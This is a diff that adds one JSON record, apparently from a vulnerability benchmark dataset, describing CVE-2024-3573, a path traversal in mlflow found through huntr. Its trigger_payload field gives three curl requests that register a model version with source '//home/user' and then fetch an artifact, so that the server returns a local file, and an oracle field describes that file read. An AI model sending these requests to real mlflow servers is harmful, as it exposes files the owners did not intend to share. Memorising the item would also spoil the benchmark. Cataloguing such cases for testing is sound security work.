@@ -1,0 +1,15 @@
+{
+  "file_id": "182_mlflow_huntr_8ea058a7-4ef8-4baf-9198-bc0147fc543c",
+  "numeric_id": "182",
+  "library_hint": "mlflow",
+  "source": "huntr",
+  "title": "Path traversal vulnerability due to improper URI scheme and hostname validation in mlflow/mlflow",
+  "cve": "CVE-2024-3573",
+  "cwe": "CWE-29: Path Traversal",
+  "library": "mlflow",
+  "affected_version": ">= 2.7.1",
+  "vulnerable_function": "N/A",
+  "triggerability": "direct",
+  "trigger_payload": "curl -X POST -H 'Content-Type: application/json' -d '{\"name\": \"poc\"}' 'http://127.0.0.1:5000/models/create'\ncurl -X POST -H 'Content-Type: application/json' -d '{\"name\": \"poc\", \"source\": \"//home/user\"}' 'http://127.0.0.1:5000/model-versions/create'\ncurl 'http://127.0.0.1:5000/model-versions/get-artifact?path=poc.txt&name=poc&version=1'",
+  "oracle": "The server reads and returns the contents of a file located at /home/user/poc.txt, which is not intended to be accessible via the API."
+}
